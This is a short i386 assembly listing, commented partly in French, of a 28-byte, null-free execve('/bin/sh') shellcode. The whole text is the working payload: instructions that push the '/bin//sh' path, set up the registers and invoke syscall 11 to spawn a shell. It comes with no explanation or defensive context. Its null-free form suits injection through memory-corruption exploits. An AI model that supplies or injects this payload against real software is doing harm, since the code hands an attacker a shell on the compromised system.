; execve("/bin/sh", NULL, NULL) - i386 - 28 octets, sans \x00
xor eax, eax
push eax
push 0x68732f2f      ; "//sh"
push 0x6e69622f      ; "/bin"
mov  ebx, esp
push eax
push ebx
mov  ecx, esp
xor  edx, edx
mov  al, 0x0b        ; __NR_execve
int  0x80
